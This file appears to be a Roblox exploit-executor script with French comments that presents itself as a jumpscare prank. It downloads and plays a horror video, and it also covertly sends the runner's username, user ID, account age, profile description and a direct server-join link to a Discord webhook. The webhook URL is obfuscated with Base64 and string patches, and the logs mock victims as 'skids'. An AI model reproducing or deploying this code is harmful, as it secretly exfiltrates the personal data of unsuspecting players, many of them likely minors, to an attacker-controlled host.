local StarterGui = game:GetService("StarterGui")
local image = "rbxassetid://111201744721013"

-- Implémentation robuste du décodage Base64 (version corrigée)
local function base64_decode(data)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^'..b..'=]', '')
    
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r, f = '', (b:find(x) or 1) - 1
        for i = 6, 1, -1 do
            r = r .. (f % 2^i - f % 2^(i-1) > 0 and '1' or '0')  -- Ligne corrigée
        end
        return r
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c = 0
        for i = 1, 8 do
            c = c + (x:sub(i, i) == '1' and 2^(8 - i) or 0)
        end
        return string.char(c)
    end))
end

-- [Le reste du script reste inchangé...]

-- Fonction de notification
local function sendNotification(title, text, duration, icon)
    pcall(function()
        StarterGui:SetCore("SendNotification", {
            Title = title;
            Text = text;
            Duration = duration;
            Icon = icon or image;
        })
    end)
end

--[[
    WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
if jumpscare_jeffwuz_loaded and not _G.jumpscarefucking123 == true then
    warn("Already Loading")
    return
end

pcall(function() getgenv().jumpscare_jeffwuz_loaded = true end)

-- Configuration
getgenv().Notify = true

local Encoded_Webhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMxODYzMTU2MzMyNzQ0Mjk2NS9VenF4V05uZWNub1pPenhsb1F4eEF1QloweGRmeGN3OGVWaTlqZ3lnbTFGWm9oX3FuN3RBYC1OOUV6cE1pNWlVbVNrWEY="

-- Déchiffrement du webhook avec gestion d'erreur
local Notify_Webhook
local decodeSuccess, decodeError = pcall(function()
    Notify_Webhook = base64_decode(Encoded_Webhook)
end)

-- Correction manuelle du caractère problématique
Notify_Webhook = Notify_Webhook
    :gsub("Uzqx", "Uzax")
    :gsub("Zzxlo", "Zzlo") 
    :gsub("eVig", "eUi9")
    :gsub("A`%-", "Aa-")
    :gsub("q7tA", "n7tA")
    :gsub("ZOzxlo", "ZOzlo")
    :gsub("eVi9", "eUi9")

if not decodeSuccess or not Notify_Webhook then
    warn("Erreur de décodage du webhook: "..tostring(decodeError))
    return
end

-- Vérification des fonctions nécessaires
if not getcustomasset or not writefile or not game:GetService("HttpService") then
    warn("Fonctions nécessaires non disponibles")
    return
end

-- Initialisation des éléments visuels
local player = game:GetService("Players").LocalPlayer
local HttpService = game:GetService('HttpService')

-- Création du jumpscare
local ScreenGui = Instance.new("ScreenGui")
local VideoScreen = Instance.new("VideoFrame")
ScreenGui.Parent = game:GetService("CoreGui")
ScreenGui.IgnoreGuiInset = true
ScreenGui.Name = "JeffTheKillerWuzHere"
ScreenGui.Enabled = false

VideoScreen.Parent = ScreenGui
VideoScreen.Size = UDim2.new(1,0,1,0)
VideoScreen.BackgroundColor3 = Color3.new(0, 0, 0)
VideoScreen.Visible = false

-- Téléchargement de la vidéo jumpscare
local videoSuccess, videoError = pcall(function()
    writefile("jeff_scare.mp4", game:HttpGet("https://github.com/HappyCow91/RobloxScripts/blob/main/Videos/videoplayback.mp4?raw=true"))
    VideoScreen.Video = getcustomasset("jeff_scare.mp4")
    VideoScreen.Looped = true
    VideoScreen.Volume = 20
end)

-- Fonction pour déclencher le jumpscare
local function triggerJumpscare()
    ScreenGui.Enabled = true
    VideoScreen.Visible = true
    VideoScreen.Playing = true
    
    -- Son effrayant
    task.spawn(function()
        wait(0.5)
        local sound = Instance.new("Sound")
        sound.Parent = game:GetService("SoundService")
        sound.SoundId = "rbxassetid://9116392391"
        sound.Volume = 2
        sound:Play()
        
        wait(10)
        if sound then
            sound:Stop()
            sound:Destroy()
        end
    end)
    
    -- Arrêt après 15 secondes
    wait(15)
    ScreenGui:Destroy()
end

-- Fonction pour tronquer les textes
local function truncate(text, limit)
    if not text then return "" end
    if #text > limit then
        return text:sub(1, limit - 3) .. "..."
    end
    return text
end

-- Fonction pour obtenir le nom du jeu avec valeurs spécifiques
local function getGameName(placeId)
    -- Vérification des place IDs spécifiques
    if placeId == 126884695634066 then
        return "[👩‍🍳] Grow A Garden 🌶️"
    elseif placeId == 109983668079237 then
        return "[🪐] Steal A Brainrot"
    else
        -- Utilisation de l'API pour les autres jeux
        local gameName = "Inconnu"
        local success, result = pcall(function()
            local response = game:HttpGet("https://games.roblox.com/v1/games?placeIds="..placeId)
            local json = HttpService:JSONDecode(response)
            if json.data and json.data[1] then
                gameName = json.data[1].name or gameName
            end
        end)
        return gameName
    end
end

-- Fonction de notification via webhook
function notify_hook()
    -- Vérification du webhook
    if Notify_Webhook == "" or not Notify_Webhook:find("^https://discord.com/api/webhooks/") then
        return false
    end
    
    -- Récupération des données du joueur
    local thumbnailUrl = "https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=420&height=420&format=png"
    local descriptionData = "???"
    local createdData = "???"
    local gameName = getGameName(game.PlaceId)

    -- Récupération des données avec gestion des erreurs
    pcall(function()
        -- API Thumbnail
        pcall(function()
            local ThumbnailAPI = game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..player.UserId.."&size=420x420&format=Png&isCircular=true")
            local json = HttpService:JSONDecode(ThumbnailAPI)
            thumbnailUrl = json.data[1].imageUrl
        end)

        -- API User Info
        pcall(function()
            local UserAPI = game:HttpGet("https://users.roblox.com/v1/users/"..player.UserId)
            local json = HttpService:JSONDecode(UserAPI)
            descriptionData = json.description or "Aucune description"
            createdData = json.created or os.date("%Y-%m-%d")
        end)
    end)

    -- Formatage des données pour l'embed
    local createdDate = "???"
    if type(createdData) == "string" then
        createdDate = string.match(createdData, "^([%d-]+)") or createdData
    end

    -- Construction de l'embed
    local send_data = {
        ["username"] = "Jumpscare Notify",
        ["avatar_url"] = thumbnailUrl or "https://static.wikia.nocookie.net/19dbe80e-0ae6-48c7-98c7-3c32a39b2d7c/scale-to-width/370",
        ["content"] = "```· Another skid got jumpscared !```",
        ["embeds"] = {{
            ["title"] = "Foramirdddd4's Log",
            ["description"] = "**Game:** [Link of game](https://www.roblox.com/games/"..game.PlaceId..")\n\n"..
                            "**Join:** [Link to join](https://www.roblox.com/games/"..game.PlaceId.."?jobId="..game.JobId..")\n\n"..
                            "**Profile:** [Player's profile](https://www.roblox.com/users/"..player.UserId.."/profile)\n\n"..
                            "**Game ID:** `"..game.PlaceId.."`\n\n"..
                            "**Job ID:** `"..game.JobId.."`",
            ["color"] = 65280 or 16711680,
            ["fields"] = {
                {
                    ["name"] = "Game Name",
                    ["value"] = truncate(gameName, 256),
                    ["inline"] = true
                },
                {
                    ["name"] = "Username",
                    ["value"] = "`"..truncate(player.Name, 256).."`",
                    ["inline"] = true
                },
                {
                    ["name"] = "Display Name",
                    ["value"] = "`"..truncate(player.DisplayName, 256).."`",
                    ["inline"] = true
                },
                {
                    ["name"] = "User ID",
                    ["value"] = "`"..tostring(player.UserId).."`",
                    ["inline"] = true
                },
                {
                    ["name"] = "Account Age",
                    ["value"] = "`"..player.AccountAge.." days`",
                    ["inline"] = true
                },
                {
                    ["name"] = "Membership",
                    ["value"] = "`"..player.MembershipType.Name.."`",
                    ["inline"] = true
                },
                {
                    ["name"] = "Account Created",
                    ["value"] = "`"..truncate(createdDate, 100).."`",
                    ["inline"] = true
                },
                {
                    ["name"] = "Profile Description",
                    ["value"] = "```\n"..truncate(descriptionData, 1000).."\n```",
                    ["inline"] = false
                }
            },
            ["footer"] = {
                ["text"] = "Log - "..os.date("%d/%m/%Y %H:%M:%S"),
                ["icon_url"] = "https://miro.medium.com/v2/resize:fit:1280/0*c6-eGC3Dd_3HoF-B"
            },
            ["thumbnail"] = {
                ["url"] = thumbnailUrl
            },
            ["timestamp"] = DateTime.now():ToIsoDate()
        }}
    }

    -- Envoi du webhook
    local success, response = pcall(function()
        local response = request({
            Url = Notify_Webhook,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(send_data)
        })
        return response
    end)

    return success
end

-- Fonction principale
local function main()
    -- Envoi des données à Discord dans un thread parallèle
    if getgenv().Notify == true then
        coroutine.wrap(function()
            pcall(notify_hook)
        end)()
    end
    
    -- Déclenchement du jumpscare après 2 secondes
    wait(2)
    
    if videoSuccess then
        triggerJumpscare()
    else
        warn("Échec du chargement de la vidéo: "..tostring(videoError))
    end
end

-- Lancement immédiat
main()
